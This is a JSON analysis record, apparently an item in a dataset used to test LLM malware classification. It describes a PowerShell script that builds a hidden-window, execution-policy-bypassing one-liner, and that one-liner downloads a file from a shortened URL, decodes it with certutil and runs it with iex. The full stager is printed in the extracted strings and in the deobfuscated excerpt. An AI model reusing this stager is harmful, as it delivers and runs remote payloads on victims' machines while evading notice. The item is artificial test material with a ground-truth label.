@@ -1,0 +1,89 @@
+{
+  "meta": {
+    "quelldatei": "tech_011_Base64-irm.ps1",
+    "sha256": "b181227d7a565a69b64ea211c7f9e94805c71c806991598383de48e7add94205",
+    "groesse_bytes": 444,
+    "zeilen": 13,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "Enter the URL (use https://t.ly/)",
+      "\r\npowershell -NoP -W H -Ep Bypass irm $url -O $env:USERPROFILE\\e.txt;certutil -f -decode $env:USERPROFILE\\e.txt $env:USERPROFILE\\d.ps1;iex $env:USERPROFILE\\d.ps1\r\n",
+      "$env:USERPROFILE\\Desktop\\Base64-irm.txt",
+      "Script saved as $scriptPath"
+    ],
+    "string_anzahl_gesamt": 4,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "Enter the URL (use https://t.ly/)",
+      "\r\npowershell -NoP -W H -Ep Bypass irm $url -O $env:USERPROFILE\\e.txt;certutil -f -decode $env:USERPROFILE\\e.txt $env:USERPROFILE\\d.ps1;iex $env:USERPROFILE\\d.ps1\r\n",
+      "$env:USERPROFILE\\Desktop\\Base64-irm.txt",
+      "Script saved as $scriptPath"
+    ],
+    "string_anzahl_gesamt": 4,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Read-Host",
+      "Set-Content",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {
+      "noprofile": 1
+    },
+    "iocs": {
+      "urls": [
+        "https://t.ly/"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:USERPROFILE\\Desktop\\Base64-irm.txt",
+        "$env:USERPROFILE\\d.ps1",
+        "$env:USERPROFILE\\d.ps1;iex",
+        "$env:USERPROFILE\\e.txt",
+        "$env:USERPROFILE\\e.txt;certutil"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "Enter the URL (use https://t.ly/)",
+      "\r\npowershell -NoP -W H -Ep Bypass irm $url -O $env:USERPROFILE\\e.txt;certutil -f -decode $env:USERPROFILE\\e.txt $env:USERPROFILE\\d.ps1;iex $env:USERPROFILE\\d.ps1\r\n",
+      "$env:USERPROFILE\\Desktop\\Base64-irm.txt",
+      "Script saved as $scriptPath"
+    ],
+    "string_anzahl_gesamt": 4,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Read-Host",
+      "Set-Content",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {
+      "noprofile": 1
+    },
+    "iocs": {
+      "urls": [
+        "https://t.ly/"
+      ],
+      "ipv4": [],
+      "pfade": [
+        "$env:USERPROFILE\\Desktop\\Base64-irm.txt",
+        "$env:USERPROFILE\\d.ps1",
+        "$env:USERPROFILE\\d.ps1;iex",
+        "$env:USERPROFILE\\e.txt",
+        "$env:USERPROFILE\\e.txt;certutil"
+      ]
+    },
+    "deobfuskiert_auszug": "function Base64-irm {\r\n    $url = Read-Host \"Enter the URL (use https://t.ly/)\"\r\n\r\n    $scriptContent = @\"\r\npowershell -NoP -W H -Ep Bypass irm $url -O $env:USERPROFILE\\e.txt;certutil -f -decode $env:USERPROFILE\\e.txt $env:USERPROFILE\\d.ps1;iex $env:USERPROFILE\\d.ps1\r\n\"@\r\n\r\n    $scriptPath = \"$env:USERPROFILE\\Desktop\\Base64-irm.txt\"\r\n    Set-Content -Path $scriptPath -Value $scriptContent\r\n\r\n    Write-Host \"Script saved as $scriptPath\"\r\n}\r\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": []
+  }
+}
